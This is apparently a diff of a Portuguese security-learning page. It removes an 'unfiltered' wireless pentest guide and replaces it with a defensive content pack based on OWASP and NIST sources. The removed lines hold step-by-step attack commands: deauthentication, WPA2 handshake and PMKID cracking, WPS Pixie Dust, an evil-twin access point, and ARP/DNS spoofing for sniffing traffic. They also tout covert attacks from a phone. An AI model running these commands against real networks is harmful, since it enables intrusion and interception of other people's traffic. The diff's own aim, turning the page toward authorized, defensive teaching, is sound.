@@ -1,337 +1,211 @@
-# MATERIAL DE ESTUDO PREMIUM - SEGURANÇA WIRELESS
-## Do Zero ao Raciocínio de Pentest
-### Versão Completa - Sem Filtros
-
----
-
-## REGRAS DE OURO
-
-- **Escopo primeiro:** só pratique em rede própria, laboratório isolado ou ambiente autorizado por escrito.
-- **Entenda antes de executar:** saiba o que cada ferramenta tenta provar e qual evidência gera.
-- **Relatório manda no jogo:** pentest sem documentação vira bagunça.
-- **Defesa é o fechamento:** cada técnica estudada termina com mitigação e detecção.
-
----
-
-## MAPA DE ESTUDO
-
-| Fase | O que dominar | Entrega esperada |
-|------|---------------|------------------|
-| 1. Base Linux | Terminal, arquivos, permissões, comandos | Se mover no Kali sem se perder |
-| 2. Rede TCP/IP | IP, MAC, DNS, DHCP, gateway, portas | Ler uma rede como um mapa |
-| 3. Wireless 802.11 | Canais, sinal, modos de placa, handshake | Entender o que acontece no ar |
-| 4. Ferramentas | Função, evidência, limitação | Saber quando usar cada uma |
-| 5. Técnicas | Ataques como hipóteses de teste | Traduzir técnica em risco e correção |
-| 6. Relatório | Checklist, escopo, vulnerabilidades | Relatório profissional |
-
----
-
-# MÓDULO 1: LINUX PARA PENTEST
-
-## O que é o Linux?
-
-Linux é um sistema operacional. O Kali Linux é uma versão especial que já vem com ferramentas de segurança instaladas.
-
-## O Terminal
-
-É onde você digita comandos em vez de clicar em ícones.
-
-## Comandos Essenciais
-
-```bash
-# QUEM SOU EU?
-whoami
-
-# ONDE ESTOU?
-pwd
-
-# O QUE TEM AQUI?
-ls              # Lista arquivos
-ls -la          # Detalhes + ocultos
-ls -lah         # Tamanho legível
-
-# IR PARA OUTRO LUGAR
-cd Desktop      # Entra na pasta
-cd ..           # Volta uma pasta
-cd ~            # Volta para /home/kali
-cd -            # Volta para pasta anterior
-
-# CRIAR PASTA
-mkdir pentest
-mkdir -p pasta1/pasta2/pasta3
-
-# CRIAR ARQUIVO VAZIO
-touch notas.txt
-
-# VER CONTEÚDO
-cat notas.txt
-cat -n notas.txt
-
-# ESCREVER/ADICIONAR
-echo "texto" > notas.txt      # Cria ou sobrescreve
-echo "texto" >> notas.txt     # Adiciona ao final
-
-# COPIAR
-cp arquivo.txt destino/
-cp -r pasta1 pasta2
-
-# MOVER/RENOMEAR
-mv arquivo.txt novo_nome.txt
-
-# DELETAR (CUIDADO!)
-rm notas.txt
-rm -rf pasta/
-
-# EDITAR
-nano notas.txt
-# Ctrl+O = salvar | Ctrl+X = sair
-
-# PROCURAR TEXTO
-grep "senha" notas.txt
-grep -i "Senha" notas.txt
-grep -r "senha" /caminho/
-grep -n "senha" notas.txt
-
-# PERMISSÕES
-chmod +x script.sh
-chmod 700 script.sh
-chmod 777 script.sh  # Inseguro!
-
-# INSTALAR
-sudo apt update && sudo apt upgrade
-sudo apt install nomedoprograma
-```
-
-## Redirecionamentos
-
-```bash
-# >  : salva em arquivo (sobrescreve)
-ls > listagem.txt
-
-# >> : adiciona ao final
-echo "linha" >> listagem.txt
-
-# |  : pipe - passa saída para outro comando
-ls | grep txt
-ps aux | grep chrome
-```
-
-## Atalhos
-
-| Atalho | Função |
-|--------|--------|
-| Tab | Auto-completa |
-| Ctrl+C | Para comando |
-| Ctrl+D | Sai do terminal |
-| Ctrl+L | Limpa tela |
-| Ctrl+A | Início da linha |
-| Ctrl+E | Final da linha |
-| Seta ↑ | Último comando |
-| Ctrl+R | Pesquisar histórico |
-
----
-
-# MÓDULO 2: REDES TCP/IP
-
-## Conceitos
-
-- **IP:** Endereço lógico (192.168.1.100)
-- **MAC:** Endereço físico único da placa (00:1A:2B:3C:4D:5E)
-- **Gateway:** Roteador que dá acesso à internet
-- **Máscara:** Tamanho da rede (/24 = 254 hosts)
-- **DNS:** Traduz nomes (google.com) para IPs
-
-## Comandos
-
-```bash
-ip a                      # Ver IP
-ip route                  # Ver gateway (default via 192.168.1.1)
-arp -a / ip neigh         # Tabela ARP (IP x MAC)
-cat /etc/resolv.conf      # Ver DNS
-ping -c 4 8.8.8.8         # Testar conexão
-traceroute google.com     # Ver caminho até o destino
-nslookup google.com       # Consultar DNS
-sudo dhclient -r          # Liberar IP
-sudo dhclient             # Pegar IP novo
-```
-
-## Portas Comuns
-
-21 FTP | 22 SSH | 23 Telnet | 25 SMTP | 53 DNS | 80 HTTP | 443 HTTPS | 445 SMB | 3306 MySQL | 3389 RDP
-
-## TCP vs UDP
-
-TCP: confiável, confirma entrega. UDP: rápido, sem confirmação.
-
----
-
-# MÓDULO 3: WI-FI 802.11
-
-## Frequências
-
-2.4 GHz: maior alcance, menor velocidade, mais interferência
-5 GHz: menor alcance, maior velocidade, menos interferência
-
-Canais 2.4 GHz sem sobreposição: 1, 6, 11
-
-## dBm (força do sinal)
-
--30 a -50: excelente | -60: bom | -70: razoável | -80: fraco | -90: muito fraco
-
-## Modos de Placa
-
-- **Managed:** normal, cliente conectado ao roteador
-- **Monitor:** detetive, escuta tudo no ar
-
-```bash
-sudo airmon-ng check kill
-sudo airmon-ng start wlan0   # Cria wlan0mon
-iwconfig                      # Verificar
-sudo airmon-ng stop wlan0mon
-```
-
-## Tipos de Segurança
-
-WEP: péssima (minutos) | WPA: fraca (dicionário) | WPA2: boa (dicionário/PMKID/WPS) | WPA3: muito boa (Dragonblood/downgrade)
-
-## Handshake
-
-Aperto de mão de 4 passos. Capture e teste senhas offline.
-
-## WPS
-
-PIN 8 dígitos em 2 partes (4+4). 11 mil tentativas contra 100 milhões. Pixie Dust: segundos.
-
----
-
-# MÓDULO 4: FERRAMENTAS
-
-## aircrack-ng Suite
-
-```bash
-sudo airmon-ng start wlan0
-sudo airodump-ng wlan0mon
-sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w captura wlan0mon
-sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
-aircrack-ng -w /usr/share/wordlists/rockyou.txt captura-01.cap
-aircrack-ng captura-01.cap   # Verificar handshake
-besside-ng wlan0mon           # Modo automático
-```
-
-## bettercap
-
-```bash
-sudo bettercap
-# Comandos internos:
-net.show       # Dispositivos na rede
-net.sniff on   # Farejar tráfego
-arp.spoof on   # ARP Spoofing
-wifi.ap on     # AP falso
-dns.spoof on   # DNS Spoofing
-```
-
-## hashcat
-
-```bash
-cap2hccapx captura.cap captura.hccapx
-hashcat -m 2500 captura.hccapx wordlist.txt         # WPA/WPA2
-hashcat -m 22000 hash.hc22000 wordlist.txt          # PMKID/WPA3
-hashcat -m 2500 captura.hccapx wordlist.txt -r /usr/share/hashcat/rules/best64.rule
-```
-
-## PMKID Attack
-
-```bash
-sudo hcxdumptool -i wlan0mon -o captura.pcapng --enable_status=1
-hcxpcapngtool -o hash.hc22000 captura.pcapng
-hashcat -m 22000 hash.hc22000 wordlist.txt
-```
-
-## WPS Attack
-
-```bash
-wash -i wlan0mon
-sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vv   # Pixie Dust
-sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv        # PIN normal
-sudo bully -b AA:BB:CC:DD:EE:FF wlan0mon                 # Alternativa
-```
-
----
-
-# MÓDULO 5: ATAQUES
-
-## WPA2 Handshake + Dicionário
-
-1. `sudo airmon-ng check kill && sudo airmon-ng start wlan0`
-2. `sudo airodump-ng wlan0mon` - anote BSSID, canal, ESSID
-3. `sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w captura wlan0mon`
-4. Outro terminal: `sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon`
-5. Quando aparecer "WPA handshake", Ctrl+C
-6. `aircrack-ng -w /usr/share/wordlists/rockyou.txt captura-01.cap`
-
-## PMKID (sem cliente)
-
-```bash
-sudo hcxdumptool -i wlan0mon -o captura.pcapng --enable_status=1
-hcxpcapngtool -o hash.hc22000 captura.pcapng
-hashcat -m 22000 hash.hc22000 wordlist.txt
-```
-
-## Evil Twin
-
-Bettercap: `sudo bettercap -eval "set wifi.ap.ssid Rede; wifi.ap on"`
-Manual: `sudo airbase-ng -e "Rede" -c 6 wlan0mon` + configurar DHCP
-
-## WPA Enterprise
-
-`sudo apt install hostapd-wpe` + configurar + executar
-
-## Pós-Exploração (MITM)
-
-```bash
-sudo bettercap -eval "set arp.spoof.targets IP; arp.spoof on; net.sniff on"
-sudo tcpdump -i wlan0mon port 80 -A
-```
-
----
-
-# MÓDULO 6: ATAQUE VIA MOBILE (ANDROID)
-
-## SIM! É Possível!
-
-Requisitos: Android com root, chipset compatível, Kali NetHunter.
-
-## Kali NetHunter
-
-Versão do Kali para Android. Mesmos comandos.
-
-Instalação: root + app NetHunter + chroot Kali + comando `nethunter`
-
-Dentro: `airmon-ng`, `airodump-ng`, `aireplay-ng` - tudo funciona.
-
-## Apps sem NetHunter
-
-zANTI (MITM/SSL strip) | WPSApp (WPS/Pixie Dust) | Bettercap mobile | DroidSheep
-
-## Termux (sem root)
-
-Comandos básicos e scripts, MAS sem modo monitor.
-
-## Vantagens Mobile
-
-1. Discrição total (celular comum)
-2. Portabilidade (cabe no bolso)
-3. Bateria própria
-4. Câmera para evidências
-5. 4G/5G para acesso remoto
-
----
-
-# MÓDULO 7: WORDLISTS
-
-## O que são?
-
-Arquivos com uma senha por linha.
-
-Principal: `/usr/share/wordlists/rockyou.txt`
-Descompact
+# Wireless Lab Drive — Pack de Conteúdo Seguro
+
+Este pacote foi criado para preencher lacunas do site com conteúdo educativo de pentest autorizado, sem comandos de ataque, payloads ou automações ofensivas.
+
+## Fontes pesquisadas
+- **OWASP Web Security Testing Guide** — https://owasp.org/www-project-web-security-testing-guide/
+  Uso no conteúdo: Base para estruturar testes web autorizados, fases de teste, relatório e metodologia.
+- **OWASP WSTG v4.2** — https://owasp.org/www-project-web-security-testing-guide/v42/
+  Uso no conteúdo: Referência de categorias e organização de testes web em conteúdo educativo.
+- **OWASP ASVS** — https://owasp.org/www-project-application-security-verification-standard/
+  Uso no conteúdo: Base para requisitos de verificação de segurança de aplicações.
+- **OWASP MASVS / Mobile Application Security** — https://mas.owasp.org/MASVS/
+  Uso no conteúdo: Base para conteúdo seguro sobre avaliação mobile sem instruções ofensivas.
+- **NIST SP 800-115** — https://csrc.nist.gov/pubs/sp/800/115/final
+  Uso no conteúdo: Base para escopo, planejamento, execução autorizada, análise e mitigação.
+- **NIST SP 800-153** — https://csrc.nist.gov/pubs/sp/800/153/final
+  Uso no conteúdo: Base para segurança WLAN, configuração, ciclo de vida e monitoramento.
+- **PortSwigger Web Security Academy** — https://portswigger.net/web-security/getting-started/index.html
+  Uso no conteúdo: Referência de formato de aprendizado: teoria, prática controlada e progresso.
+
+## Módulos
+
+### 01. Escopo, Ética e Laboratório Autorizado
+Antes de qualquer teste, o profissional define permissão, objetivo, limites e evidências.
+
+#### O que é pentest autorizado
+Pentest autorizado é uma avaliação técnica feita com permissão explícita, escopo definido, janela de teste e objetivo documentado. O foco não é invadir por curiosidade; é encontrar riscos, provar impacto de forma controlada e orientar correções.
+
+#### Contrato mental do laboratório
+Todo exercício do site deve assumir ambiente controlado: máquinas próprias, labs legais, CTFs, sistemas de treinamento ou autorização formal. Sem escopo, não existe teste profissional.
+
+#### Entregáveis de um teste
+- Objetivo do teste
+- Ativos permitidos
+- O que está fora do escopo
+- Janela de execução
+- Riscos aceitos
+- Evidências coletadas
+- Recomendações de correção
+
+#### Como pensar como consultor
+O melhor relatório não é uma coleção de falhas. É uma tradução de risco técnico para decisão prática: o que aconteceu, por que importa, como corrigir e como validar a correção.
+
+### 02. Linux e Terminal para Laboratório
+Base operacional para navegar, organizar evidências e entender ambientes técnicos.
+
+#### Terminal como painel de controle
+O terminal é uma interface de precisão. No estudo defensivo, ele serve para navegar por arquivos, ler logs, organizar evidências, executar ferramentas autorizadas e entender como sistemas respondem.
+
+#### Estrutura de arquivos e evidências
+- Criar pasta por projeto/laboratório
+- Separar anotações, capturas e resultados
+- Registrar data e contexto
+- Evitar misturar evidências de ambientes diferentes
+- Manter histórico de decisões
+
+#### Permissões sem bagunça
+Entender permissões ajuda a interpretar riscos sem sair alterando o ambiente. O foco do estudo é reconhecer impacto, não quebrar a máquina.
+
+#### Rotina de estudo
+Leia um conceito, pratique em laboratório permitido, registre evidências e escreva a conclusão em linguagem simples.
+
+### 03. Redes TCP/IP
+Fundamento para entender comunicação, roteamento, portas, serviços e segmentação.
+
+#### IP, máscara e gateway
+IP identifica o host, máscara define o alcance da rede e gateway conecta a rede local a outros destinos. Esse trio explica boa parte dos problemas e riscos de comunicação.
+
+#### Portas e serviços
+Portas expõem serviços. Em uma avaliação segura, o objetivo é inventariar o que deveria estar disponível, o que apareceu sem necessidade e o que precisa de restrição ou autenticação.
+
+#### DNS, DHCP e identidade de rede
+DNS resolve nomes, DHCP entrega configuração e registros ajudam a entender quem está na rede. Em defesa, esses dados ajudam a identificar inconsistências e ativos esquecidos.
+
+#### Segmentação
+Uma rede bem segmentada limita impacto. Visitantes, servidores, estações, IoT e administração não devem viver no mesmo espaço sem controle.
+
+### 04. Wi‑Fi 802.11 e Segurança WLAN
+Como redes sem fio funcionam e como defender configuração, acesso e monitoramento.
+
+#### Arquitetura WLAN
+Uma WLAN combina clientes, pontos de acesso, controladoras e políticas. Segurança depende de configuração, autenticação, atualização, segmentação e monitoramento contínuo.
+
+#### Autenticação e criptografia
+O estudo deve comparar modelos de autenticação, força de senhas, uso de WPA2/WPA3, isolamento de clientes e separação de redes convidadas.
+
+#### Checklist de defesa Wi‑Fi
+- Usar criptografia moderna
+- Separar rede corporativa e convidados
+- Remover credenciais padrão
+- Atualizar firmware
+- Reduzir exposição desnecessária
+- Monitorar APs desconhecidos
+- Documentar SSIDs e responsáveis
+
+#### Relatório WLAN
+Um bom relatório WLAN explica configuração atual, risco percebido, impacto no negócio, recomendações e forma de validar a correção sem expor detalhes sensíveis.
+
+### 05. Metodologia de Teste Autorizado
+Planejamento, execução controlada, evidência, análise e mitigação.
+
+#### Fases seguras
+Um teste profissional passa por preparação, entendimento do alvo permitido, verificação controlada, análise, priorização, relatório e reteste. A qualidade está na organização.
+
+#### Evidência boa
+- Captura clara
+- Data e hora
+- Ativo relacionado
+- Impacto explicado
+- Risco sem exagero
+- Correção recomendada
+- Validação sugerida
+
+#### Severidade sem teatro
+Severidade deve considerar probabilidade, impacto, exposição, facilidade de correção e contexto do ambiente. Nem tudo que parece técnico é crítico.
+
+### 06. Segurança Web com OWASP
+Raciocínio de testes web, requisitos de segurança e categorias de risco.
+
+#### WSTG como mapa de estudo
+O OWASP WSTG organiza testes web em categorias. Para estudo, ele funciona como mapa: entender objetivo, observar evidências, registrar impacto e propor correção.
+
+#### ASVS como régua de qualidade
+O ASVS ajuda a transformar segurança em requisito verificável. Em vez de dizer 'está seguro', o relatório aponta quais controles foram avaliados e qual nível de confiança existe.
+
+#### Checklist web seguro
+- Autenticação clara
+- Controle de acesso por função
+- Validação de entrada
+- Sessões protegidas
+- Logs úteis
+- Erros sem vazamento de informação
+- Configuração segura
+
+#### Prática controlada
+Use ambientes de treinamento legalizados. O objetivo é consolidar raciocínio, não testar sistemas aleatórios.
+
+### 07. Segurança Mobile Android
+Avaliação defensiva de apps mobile usando critérios de armazenamento, rede, autenticação e privacidade.
+
+#### Mobile é avaliação autorizada
+Substitua nomenclaturas antigas por 'Segurança Mobile Android'. O foco da página deve ser avaliação autorizada, proteção de dados e verificação de controles.
+
+#### MASVS como base
+O OWASP MASVS organiza controles para apps mobile, incluindo armazenamento seguro, comunicação, autenticação, criptografia, privacidade e resiliência.
+
+#### O que observar em apps
+- Dados sensíveis armazenados
+- Comunicação protegida
+- Autenticação e sessão
+- Permissões solicitadas
+- Logs em produção
+- Configuração de build
+- Privacidade e consentimento
+
+#### Resultado esperado
+A entrega mobile deve explicar risco, evidência e recomendação, sem expor segredos do app ou instruções reutilizáveis fora do laboratório autorizado.
+
+### 08. Ferramentas, Evidências e Organização
+Como usar ferramentas de forma responsável e transformar saída técnica em entendimento.
+
+#### Ferramenta não substitui raciocínio
+Ferramentas ajudam a coletar sinais, mas o valor está em interpretar resultado, confirmar contexto e explicar o risco de forma compreensível.
+
+#### Registro de evidências
+- Salvar origem do dado
+- Anotar hipótese
+- Anotar resultado
+- Separar falso positivo
+- Escrever impacto
+- Criar recomendação
+
+#### Boas práticas
+Use ferramentas apenas em ambiente autorizado. Evite executar qualquer teste fora do escopo e registre decisões técnicas durante o processo.
+
+### 09. Defesa, Hardening e Monitoramento
+Corrigir, reduzir exposição e acompanhar o ambiente depois do teste.
+
+#### Hardening
+Hardening é reduzir superfície de ataque: remover o que não precisa, configurar com segurança, atualizar componentes e limitar acessos.
+
+#### Monitoramento
+Sem monitoramento, falhas voltam despercebidas. Logs, alertas, inventário e revisão periódica ajudam a manter o ambiente sob controle.
+
+#### Checklist pós-correção
+- Correção aplicada
+- Configuração revisada
+- Reteste realizado
+- Evidência atualizada
+- Responsável definido
+- Prazo registrado
+
+### 10. Relatório Profissional
+Transformar estudo técnico em entrega clara, útil e confiável.
+
+#### Estrutura recomendada
+- Resumo executivo
+- Escopo
+- Metodologia
+- Achados
+- Evidências
+- Risco
+- Recomendações
+- Plano de correção
+- Reteste
+
+#### Linguagem
+Relatório bom é direto: explica o problema, por que importa, onde foi visto e como corrigir. Evite drama técnico e evite esconder incertezas.
+
+#### Portfólio de estudo
+Em labs legais, transforme cada módulo em um mini relatório. Isso cria portfólio e melhora sua leitura profissional.
